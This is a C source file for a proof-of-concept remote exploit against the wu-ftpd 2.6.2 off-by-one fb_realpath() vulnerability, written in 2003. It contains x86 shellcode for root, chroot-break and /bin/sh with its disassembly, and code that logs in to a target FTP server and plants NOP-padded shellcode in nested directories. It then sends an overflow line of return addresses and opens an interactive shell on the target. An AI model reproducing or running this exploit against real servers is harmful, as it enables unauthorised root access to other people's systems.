/*
 * $Header: /home/backup/prog/c/meus/wu-ftpd/RCS/wux.c,v 1.1 2003/08/03 17:16:39 none Exp none $
 * $Date: 2003/08/03 17:16:39 $
 *
 * Author: 
 * 		Marcello de Lima Azambuja
 *
 * Description: P-o-C for wu-ftpd 2.6.2 off-by-one fb_realpath() vulnerability
 *
 * $Log: wux.c,v $
 * Revision 1.1  2003/08/03 17:16:39  none
 * Initial revision
 *
 */

static const char rcsid[] =	
	"$Id: wux.c,v 1.1 2003/08/03 17:16:39 none Exp none $";

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <errno.h>

#if defined(LINUX) || defined(__LINUX__) || defined(__linux__)
#define _GNU_SOURCE
#include <getopt.h>
#endif

#define	BUF_SIZE	4100
#define DIR_SIZE	250

#define WU_OK		"220 "
#define ANON_OK		"230 Guest login ok"
#define USERNAME_OK	"331 "
#define PASSWD_FAIL	"530 Login incorrect."
#define LOGIN_OK	"230 User "
#define CWD_OK		"250 CWD command successful."
#define MKD_OK		"new directory created."
#define MKD_EXIST	"directory exists"

extern int errno;
extern int h_errno;

extern char *optarg;	/*	option argument  			*/
extern int optind;		/*  option/arg index  			*/
extern int opterr;		/*  error manipulation flag  	*/

unsigned long int net_resolve(const char *);
unsigned long init_tcp_client(const char *, const unsigned short, int *);
int logon(int sockfd, char *username, char *password, char *directory, 
														short int mkd);
void shell (int sock);
int attack(int sockfd, char *directory, char *cmd, short int mkd);

/*
char code[] =
  setuid/chroot-break/execve shellcode - \xff duplicated for wu filter 
    "\x31\xc0\x31\xdb\x31\xc9\xb0\x46\xcd\x80\x31\xc0\x31\xdb\x43\x89"
    "\xd9\x41\xb0\x3f\xcd\x80\xeb\x6b\x5e\x31\xc0\x31\xc9\x8d\x5e\x01"
    "\x88\x46\x04\x66\xb9\xff\xff\x01\xb0\x27\xcd\x80\x31\xc0\x8d\x5e"
    "\x01\xb0\x3d\xcd\x80\x31\xc0\x31\xdb\x8d\x5e\x08\x89\x43\x02\x31"
    "\xc9\xfe\xc9\x31\xc0\x8d\x5e\x08\xb0\x0c\xcd\x80\xfe\xc9\x75\xf3"
    "\x31\xc0\x88\x46\x09\x8d\x5e\x08\xb0\x3d\xcd\x80\xfe\x0e\xb0\x30"
    "\xfe\xc8\x88\x46\x04\x31\xc0\x88\x46\x07\x89\x76\x08\x89\x46\x0c"
    "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xb0\x0b\xcd\x80\x31\xc0\x31\xdb"
    "\xb0\x01\xcd\x80\xe8\x90\xff\xff\xff\xff\xff\xff\x30\x62\x69\x6e"
    "\x30\x73\x68\x31\x2e\x2e\x31\x31";
*/


/*  shellcode original  */
/*
char code[] = 
    "\x31\xc0\x31\xdb\x31\xc9\xb0\x46\xcd\x80\x31\xc0\x31\xdb\x43\x89"
    "\xd9\x41\xb0\x3f\xcd\x80\xeb\x6b\x5e\x31\xc0\x31\xc9\x8d\x5e\x01"
    "\x88\x46\x04\x66\xb9\xff\xff\x01\xb0\x27\xcd\x80\x31\xc0\x8d\x5e\x01"
    "\xb0\x3d\xcd\x80\x31\xc0\x31\xdb\x8d\x5e\x08\x89\x43\x02\x31\xc9"
    "\xfe\xc9\x31\xc0\x8d\x5e\x08\xb0\x0c\xcd\x80\xfe\xc9\x75\xf3\x31"
    "\xc0\x88\x46\x09\x8d\x5e\x08\xb0\x3d\xcd\x80\xfe\x0e\xb0\x30\xfe"
    "\xc8\x88\x46\x04\x31\xc0\x88\x46\x07\x89\x76\x08\x89\x46\x0c\x89"
    "\xf3\x8d\x4e\x08\x8d\x56\x0c\xb0\x0b\xcd\x80\x31\xc0\x31\xdb\xb0"
    "\x01\xcd\x80\xe8\x90\xff\xff\xff\xff\xff\xff\x30\x62\x69\x6e\x30\x73\x68\x31"
    "\x2e\x2e\x31\x31";
*/

/* shellcode sem chroot */
char code[] =
    "\x31\xc0\x31\xdb\x31\xc9\xb0\x46\xcd\x80\x31\xc0\x31\xdb\x43\x89"
    "\xd9\x41\xb0\x3f\xcd\x80\xeb\x6b\x5e\x31\xc0\x31\xc9\x8d\x5e\x01"
    "\x88\x46\x04\x66\xb9\xff\xff\x01\xb0\x27\xcd\x80\x31\xc0\x8d\x5e\x01"
    "\xb0\x3d\x90\x90\x31\xc0\x31\xdb\x8d\x5e\x08\x89\x43\x02\x31\xc9"
    "\xfe\xc9\x31\xc0\x8d\x5e\x08\xb0\x0c\xcd\x80\xfe\xc9\x75\xf3\x31"
    "\xc0\x88\x46\x09\x8d\x5e\x08\xb0\x3d\x90\x90\xfe\x0e\xb0\x30\xfe"
    "\xc8\x88\x46\x04\x31\xc0\x88\x46\x07\x89\x76\x08\x89\x46\x0c\x89"
    "\xf3\x8d\x4e\x08\x8d\x56\x0c\xb0\x0b\xcd\x80\x31\xc0\x31\xdb\xb0"
    "\x01\xcd\x80\xe8\x90\xff\xff\xff\xff\xff\xff\x30\x62\x69\x6e\x30\x73\x68\x31"
    "\x2e\x2e\x31\x31";


/* mkdir ban   chroot   mkdir ban  */
/*
char code[] = 
    "\x31\xc0\x31\xdb\x31\xc9\xb0\x46\xcd\x80\x31\xc0\x31\xdb\x43\x89"
    "\xd9\x41\xb0\x3f\xcd\x80\xeb\x6b\x5e\x31\xc0\x31\xc9\x8d\x5e\x01"
    "\x88\x46\x04\x66\xb9\xff\xff\x01\xb0\x27\xcd\x80\x31\xc0\x8d\x5e\x01"
    "\xb0\x3d\xcd\x80\x31\xc0\x31\xdb\x8d\x5e\x08\x89\x43\x02\x31\xc9"
    "\xfe\xc9\x31\xc0\x8d\x5e\x08\xb0\x0c\xcd\x80\xfe\xc9\x75\xf3\x31"
    "\xc0\x88\x46\x09\x8d\x5e\x08\xb0\x3d\xcd\x80\x31\xc0\x31\xc9\x8d\x5e\x01\x88\x46\x04\x66\xb9\xff\xff\x01\xb0\x27\xcd\x80"
   	"\xfe\x0e\xb0\x30\xfe"
    "\xc8\x88\x46\x04\x31\xc0\x88\x46\x07\x89\x76\x08\x89\x46\x0c\x89"
    "\xf3\x8d\x4e\x08\x8d\x56\x0c\xb0\x0b\xcd\x80\x31\xc0\x31\xdb\xb0"
    "\x01\xcd\x80\xe8\x90\xff\xff\xff\xff\xff\xff\x30\x62\x61\x6e\x30\x73\x68\x31"	// 0x69 = i  0x61 = a
    "\x2e\x2e\x31\x31";
*/

/* 
 * code[] disassembled:
 *
 * 0    xor    %eax,%eax
 * 2    xor    %ebx,%ebx
 * 4    xor    %ecx,%ecx
 * 6    mov    $0x46,%al	// setreuid(0, 0)
 * 8    int    $0x80
 * 10   xor    %eax,%eax
 * 12   xor    %ebx,%ebx
 * 14   inc    %ebx
 * 15   mov    %ebx,%ecx
 * 17   inc    %ecx
 * 18   mov    $0x3f,%al	// dup2(1, 2)
 * 20   int    $0x80
 * 22   jmp    0x8049503 <code+131>
 * 24   pop    %esi			// pop our string addr from stack
 * 25   xor    %eax,%eax
 * 27   xor    %ecx,%ecx
 * 29   lea    0x1(%esi),%ebx
 * 32   mov    %al,0x4(%esi)
 * 35   mov    $0x1ff,%cx
 * 39   mov    $0x27,%al	// mkdir("bin")
 * 41   int    $0x80
 * 43   xor    %eax,%eax
 * 45   lea    0x1(%esi),%ebx
 * 48   mov    $0x3d,%al	// chroot("bin")
 * 50   int    $0x80
 * 52   xor    %eax,%eax
 * 54   xor    %ebx,%ebx
 * 56   lea    0x8(%esi),%ebx
 * 59   mov    %eax,0x2(%ebx)
 * 62   xor    %ecx,%ecx
 * 64   dec    %cl
 * 66   xor    %eax,%eax
 * 68   lea    0x8(%esi),%ebx
 * 71   mov    $0xc,%al		// chdir("..")
 * 73   int    $0x80
 * 75   dec    %cl
 * 77   jne    0x80494c2 <code+66>	// loop 255 times
 * 79   xor    %eax,%eax
 * 81   mov    %al,0x9(%esi)
 * 84   lea    0x8(%esi),%ebx
 * 87   mov    $0x3d,%al	// chroot(".")
 * 89   int    $0x80
 *
 * 		xor		%eax, %eax
 *      xor		%ecx, %ecx
 *      lea		0x1(%esi), %ebx
 *      mov		$0x1ff, %cx
 *      mov		$0x27, %al
 *      int		$0x80
 *
 * 
 * 91   decb   (%esi)		// fix '0' to '/'
 * 93   mov    $0x30,%al
 * 95   dec    %al
 * 97   mov    %al,0x4(%esi)	// fix "/bin/sh"
 * 100  xor    %eax,%eax
 * 102  mov    %al,0x7(%esi)	// fix end of string
 * 105  mov    %esi,0x8(%esi)
 * 108  mov    %eax,0xc(%esi)	// NULL terminate /bin/sh
 * 111  mov    %esi,%ebx
 * 113  lea    0x8(%esi),%ecx
 * 116  lea    0xc(%esi),%edx
 * 119  mov    $0xb,%al		// execve("/bin/sh")
 * 121  int    $0x80
 * 123  xor    %eax,%eax
 * 125  xor    %ebx,%ebx
 * 127  mov    $0x1,%al		// exit(0)
 * 129  int    $0x80
 * 131  call   0x8049498 <code+24>
 * 136  dw     "0bin0sh1..11
*/

static void usage(const char *cmd) 
{
	fprintf(stdout, "Usage: %s [-c <command>] [-h | --help] [-d <directory>] "
			"[-u | --user <user>] [-p | --port <number>] "
			"[-w | --passwd <passwod>] [--version] <host>\n", cmd);
	fprintf(stdout, "\t-c\t\t Command to be used in exploitation. (default = DELE).\n");
	fprintf(stdout, "\t-h (or --help)\t Gives this help screen.\n");
	fprintf(stdout, 
			"\t-d\t\t Selects home directory to use (default = /pub).\n");
	fprintf(stdout, 
		"\t-u (or --user)\t Selects username to use. (default = anonymous).\n");
	fprintf(stdout, "\t-p (or --port)\t Selects a new port (default 21).\n");
	fprintf(stdout, "\t-w (or --passwd) Selects password to use.\n");
	fprintf(stdout, "\t--version\t Displays program version and exit.\n");
	fprintf(stdout, "\n\t<host>\t\t Hostname to attack.\n");
	fprintf(stdout, "\nEx.: %s -d /home/foo -u foo -w bar 127.0.0.1\n", cmd);
}


static char *Basename(const char *path) 
{
	char *base_name = 0;

	if ( ( base_name = strrchr(path, '/') ) != 0) 
		++base_name;
	else 
		base_name = (char *) path;
	return base_name;
}


int main(int argc, char *argv[]) 
{
	char 	*base_name = 0;
	char 	username[256], password[256];
	char	command[8], directory[256];
	unsigned short port = 21;
	int 	optch, sockfd;
	static char str_opts[] = "hc:d:p:u:vw:";


#if defined(LINUX) || defined(__LINUX__) || defined(__linux__)
	int cmd_index = 0;
	
	static struct option long_opts[] = {
		{ "help", 0, 0, 'h' },
		{ "user", 1, 0, 'u' },
		{ "port", 1, 0, 'p' },
		{ "passwd", 1, 0, 'w' },
		{ "version", 0, 0, 'v'},
		{ 0, 0, 0, 0 }
	};
#endif

	base_name = Basename(argv[0]);
	
	// default values
	strcpy(username, "teste");	// ftp
	strcpy(password, "teste");	// hey@joe.uk
	strcpy(directory, "/home/teste");		// /pub
	strcpy(command, "RMD");

#if defined(LINUX) || defined(__LINUX__) || defined(__linux__)
	while ( (optch = getopt_long(argc, 
							argv, str_opts, long_opts, &cmd_index)) != -1 )
#else
	while ( (optch = getopt(argc, argv, str_opts)) != -1 )
#endif
			
		switch(optch) {
			case 0:
				break;

			case 'c':
				strncpy(command, optarg, 8);
				command[7] = '\0';
				break;

			case 'd':
				strncpy(directory, optarg, 256);
				directory[255] = '\0';

				if (!strcmp(directory, "/")) break;

				// strip the trailing /
				if (directory[strlen(directory) - 1] == '/') {
					directory[strlen(directory) - 1] = '\0';
					printf("new dir = %s\n", directory);
				}
				break;

			case 'h':
				usage(base_name);
				exit(0);

			case 'p':
				port = atoi(optarg);
				break;
				
			case 'u':
				strncpy(username, optarg, 256);
				username[255] = '\0';
				break;

			case 'v':
				fprintf(stdout, "form version $Revision: 1.1 $\n");
				exit(0);

			case 'w':
				strncpy(password, optarg, 256);
				password[255] = '\0';
				break;

			default:
				fprintf(stderr, "Use --help for help.\n");
				exit(1);
		}

	argv += optind;
	argc -= optind;

	if ( argc < 1 ) {
		usage(base_name);
		fprintf(stderr, "\nTry `%s --help' for more information.\n", base_name);
		exit(1);
	}

	printf("servername %s\n", argv[0]);

	if ( init_tcp_client(argv[0], port, &sockfd) ) exit(1);

	if (logon(sockfd, username, password, directory, 1)) {
		close(sockfd);
		exit(1);
	}
	
	if (attack(sockfd, directory, command, 1)) {
		close (sockfd);
		exit(1);
	}

	close(sockfd);

	if ( init_tcp_client(argv[0], port, &sockfd) ) exit(1);

	if (logon(sockfd, username, password, directory, 0)) {
		close(sockfd);
		exit(1);
	}
	
	if (attack(sockfd, directory, command, 0)) {
		close (sockfd);
		exit(1);
	}

	shell(sockfd);

	close(sockfd);

	exit(0);
}

void shell (int sock)
{
    int l;
    char    buf[512];
    fd_set  rfds;


    while (1) {
        FD_SET (0, &rfds);
        FD_SET (sock, &rfds);

        select (sock + 1, &rfds, NULL, NULL, NULL);
        if (FD_ISSET (0, &rfds)) {
            l = read (0, buf, sizeof (buf));
            if (l <= 0) {
                perror ("read user");
                exit (EXIT_FAILURE);
            }
            write (sock, buf, l);
        }

        if (FD_ISSET (sock, &rfds)) {
            l = read (sock, buf, sizeof (buf));
            if (l <= 0) {
                perror ("read remote");
                exit (EXIT_FAILURE);
            }
            write (1, buf, l);
        }
    }
}


unsigned long int net_resolve(const char *hostname)
{
	struct hostent *he;

	if (! (he = gethostbyname(hostname)) ) return 0;
	
	return (* (unsigned long *) he->h_addr_list[0]);
}


unsigned long init_tcp_client(const char *serverHostname, 
			const unsigned short port, int *socketDescriptor)
{
	struct sockaddr_in server;

	
	*socketDescriptor = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	if (*socketDescriptor == -1) {
		fprintf(stderr, "Error creating socket: %s\n", strerror(errno));
		return (1);
	}

	memset(&server, '\0', sizeof(struct sockaddr_in));
	
	if (! (server.sin_addr.s_addr = net_resolve(serverHostname)) ) {
		fprintf(stderr, "Error resolving hostname: %s\n", hstrerror(h_errno));
		return (1);
	}

	server.sin_family = AF_INET;
	server.sin_port = htons(port);

	fprintf(stdout, "Connecting to server %s on port TCP %d... ", 
									inet_ntoa(server.sin_addr), port);

	fflush(stdout);

	if ( connect(*socketDescriptor, (struct sockaddr *) &server,
											sizeof(struct sockaddr))) {
			fprintf(stdout, "FAILED!\n");
			fprintf(stderr, "Error connecting: %s\n", strerror(errno));
			return (1);
	}

	fprintf(stdout, "OK!\n");

	return 0;
}

int logon(int sockfd, char *username, char *password, char *directory, 
													short int mkd) {
	int		n, i, j;
	char	buff[BUF_SIZE];


	sleep(1);

	memset(buff, '\0', BUF_SIZE);
	recv(sockfd, buff, BUF_SIZE-1, 0);
	if (strstr(buff, WU_OK) == NULL) {
		printf("[-] WU-FTPd Connection Failed! Recv: %s\n", buff);
		return 1;
	}

	memset(buff, '\0', BUF_SIZE);
	sprintf(buff, "USER %s\n", username);
	n = send(sockfd, buff, strlen(buff), 0);
	if (n < strlen(buff)) {
		printf("send() error: returned %d bytes - %s", n, strerror(errno));
		return 1;
	}

	sleep(1);

	memset(buff, '\0', BUF_SIZE);
	recv(sockfd, buff, BUF_SIZE-1, 0);
	if ( (strstr(buff, USERNAME_OK) == NULL) && (strstr(buff, ANON_OK) == NULL))
   	{
		printf("[-] User ID input failure! Recv: %s\n", buff);
		return 1;
	}

	memset(buff, '\0', BUF_SIZE);
	sprintf(buff, "PASS %s\n", password);	// exploit me :)
	n = send(sockfd, buff, strlen(buff), 0);
	if (n < strlen(buff)) {
		printf("send() error: returned %d bytes - %s", n, strerror(errno));
		return 1;
	}

	sleep(1);

	memset(buff, '\0', BUF_SIZE);
	recv(sockfd, buff, BUF_SIZE-1, 0);
	if (strstr(buff, PASSWD_FAIL)) {
		printf("[-] Password input failure! Recv: %s\n", buff);
		return 1;
	}
	else 
/*	if ((strstr(buff, LOGIN_OK) == NULL) && (strstr(buff, ANON_OK) == NULL)) {
		printf("[-] Login failed! Recv: %s\n", buff);
		return 1;
	}
*/
	printf("[+] Login succesfull.\n");

	memset(buff, '\0', BUF_SIZE);
	sprintf(buff, "CWD %s\n", directory);
	n = send(sockfd, buff, strlen(buff), 0);
	if (n < strlen(buff)) {
		printf("send() error: returned %d bytes - %s", n, strerror(errno));
		return 1;
	}
	
	sleep(1);

	memset(buff, '\0', BUF_SIZE);
	recv(sockfd, buff, BUF_SIZE-1, 0);
	if (strstr(buff, CWD_OK) == NULL) {
		printf("[-] CWD %s failed! Recv: %s\n", directory, buff);
		return 1;
	}

	for (i = 0; i < 16; i++) {
		if (i == 1) {
			if (mkd) {
				memset(buff, '\0', BUF_SIZE);
				strcpy(buff, "MKD ");
				for (j = 4; j < (250 - strlen(code) - 4); j++) buff[j] = '\x90';
				strcat(buff, code);
				buff[strlen(buff)] = '\n';

				n = send(sockfd, buff, strlen(buff), 0);
				if (n < strlen(buff)) {
					printf("send() error: returned %d bytes - %s", n, 
													strerror(errno));
					return 1;
				}

				sleep(1);

				memset(buff, '\0', BUF_SIZE);
				recv(sockfd, buff, BUF_SIZE-1, 0);
				if (strstr(buff, MKD_OK) == NULL) {
					if (strstr(buff, MKD_EXIST) == NULL) {
						printf("[-] Make directory failed! Recv: %s\n", buff);
						return 1;
					} else {
						printf("[!] Directory exists, trying to use it anyway.\n");
					}
				}
			} // if (mkd)

			memset(buff, '\0', BUF_SIZE);
			strncpy(buff, "CWD ", 4);
			for (j = 4; j < (250 - strlen(code) - 4); j++) buff[j] = '\x90';
			strcat(buff, code);
			buff[strlen(buff)] = '\n';

			n = send(sockfd, buff, strlen(buff), 0);
			if (n < strlen(buff)) {
				printf("send() error: returned %d bytes - %s", n, 
												strerror(errno));
				return 1;
			}

			sleep(1);

			memset(buff, '\0', BUF_SIZE);
			recv(sockfd, buff, BUF_SIZE-1, 0);
			if (strstr(buff, CWD_OK) == NULL) {
				printf("[-] CWD %s failed! Recv: %s\n", directory, buff);
				return 1;
			}

			continue;
		} // if (i == 1)

		if (mkd) {
			memset(buff, '\0', BUF_SIZE);
			strcpy(buff, "MKD ");
			if (i != 15) memset(&buff[4], 'A', DIR_SIZE);
			else memset(&buff[4], 'A', 100);
			buff[strlen(buff)] = '\n';
	
			n = send(sockfd, buff, strlen(buff), 0);
			if (n < strlen(buff)) {
				printf("send() error: returned %d bytes - %s", n, strerror(errno));
				return 1;
			}

			sleep(1);

			memset(buff, '\0', BUF_SIZE);
			recv(sockfd, buff, BUF_SIZE-1, 0);
			if (strstr(buff, MKD_OK) == NULL) {
				if (strstr(buff, MKD_EXIST) == NULL) {
					printf("[-] Make directory failed! Recv: %s\n", buff);
					return 1;
				} else {
					printf("[!] Directory exists, trying to use it anyway.\n");
				}
			}
		} // if (mkd)

		memset(buff, '\0', BUF_SIZE);
		strncpy(buff, "CWD ", 4);
		if (i != 15) memset(&buff[4], 'A', DIR_SIZE);
		else memset(&buff[4], 'A', 100);
		buff[strlen(buff)] = '\n';
		n = send(sockfd, buff, strlen(buff), 0);
		if (n < strlen(buff)) {
			printf("send() error: returned %d bytes - %s", n, strerror(errno));
			return 1;
		}

		sleep(1);

		memset(buff, '\0', BUF_SIZE);
		recv(sockfd, buff, BUF_SIZE-1, 0);
		if (strstr(buff, CWD_OK) == NULL) {
			printf("[-] CWD %s failed! Recv: %s\n", directory, buff);
			return 1;
		}
	}

	return 0;
}


int attack(int sockfd, char *directory, char *cmd, short int mkd)
{
	char    buff[BUF_SIZE], *ptr;
	int		n, pathSize = 0, k, i;
	

	/* How deep we are in the path? */
	memset(buff, '\0', BUF_SIZE);
	sprintf(buff, "PWD\n");
	n = send(sockfd, buff, strlen(buff), 0);
	if (n < strlen(buff)) {
		printf("send() error: returned %d bytes - %s", n, strerror(errno));
		return 1;
	}

	sleep(1);

	memset(buff, '\0', BUF_SIZE);
	recv(sockfd, buff, BUF_SIZE-1, 0);
	if (strstr(buff, "257") == NULL) {
		printf("[-] PWD failed! Recv: %s\n", buff);
		return 1;
	}

	for (ptr = buff+5; *ptr; ptr++) {
		if (*ptr == '"') break;
		pathSize++;
	}
	
	printf("[!] Path is %d bytes long.\n", pathSize);
	
	if (!mkd) {
		printf("[!] wu-ftpd is ready to be attached...");
		getchar();
	}

	printf("Using a ret addr directory with %d bytes\n", 4096 - pathSize - 1);
	memset(buff, '\0', BUF_SIZE);
	if (mkd) strcpy(buff, "MKD ");
	else sprintf(buff, "%s ", cmd);
//	memset(&buff[strlen(buff)], 'A', 4096 - pathSize - 1);
//	strcat(buff, "AAA");

	k = 4096 - pathSize - 1 + strlen(buff);
	for (i = strlen(buff); i < k - 4; i += 4)
//		*(unsigned long *) &buff[i] = 0x0806bdf8;
		*(unsigned long *) &buff[i] = 0xf80806bd;

	while (strlen(buff) != k) buff[i++] = '\x41';

	/*  mapped_path = 0x0806bdf8 */
	/*  fill with our code address - 0xbfffd0d5  */
	/*
	buff[42] = '\x08';
	buff[41] = '\x06';
	buff[40] = '\xbd';
	buff[39] = '\xf8';
	*/

	buff[strlen(buff)] = '\n';

	n = send(sockfd, buff, strlen(buff), 0);
	if (n < strlen(buff)) {
		printf("send() error: returned %d bytes - %s", n, strerror(errno));
		return 1;
	}
	
/*
	memset(buff, '\0', BUF_SIZE);
	sprintf(buff, "%s ", cmd);
	memset(&buff[strlen(buff)], 'A', 4096 - (16 * DIR_SIZE) - 16);
	buff[strlen(buff)] = '\n';
	n = send(sockfd, buff, strlen(buff), 0);
*/
	
//	memset(buff, '\0', BUF_SIZE);
//	sprintf(buff, "%s ", cmd);

	// We should calculate how many bytes are left to do the 1 byte overflow,
	// since strlen(wbuf) + strlen(resolved) + '/' should have 4096 bytes.
/*	if (strcmp(directory, "/"))
		memset(&buff[strlen(buff)], 'A', 4096 - (16 * DIR_SIZE) - strlen(directory) - 17);
	else
		memset(&buff[strlen(buff)], 'A', 4096 - (16 * DIR_SIZE) - 17); */

/*	memset(&buff[strlen(buff)], 'A', 4096 - pathSize);

	buff[strlen(buff)] = '\n';

	n = send(sockfd, buff, strlen(buff), 0);
	if (n < strlen(buff)) {
		printf("send() error: returned %d bytes - %s", n, strerror(errno));
		return 1;
	}

	printf("WHOA2\n");
	getchar();
*/

	if (mkd) {	
		strcpy(buff, "QUIT\n");
		n = send(sockfd, buff, strlen(buff), 0);
		if (n < strlen(buff)) {
			printf("send() error: returned %d bytes - %s", n, strerror(errno));
			return 1;
		}
	}

	return 0;
}
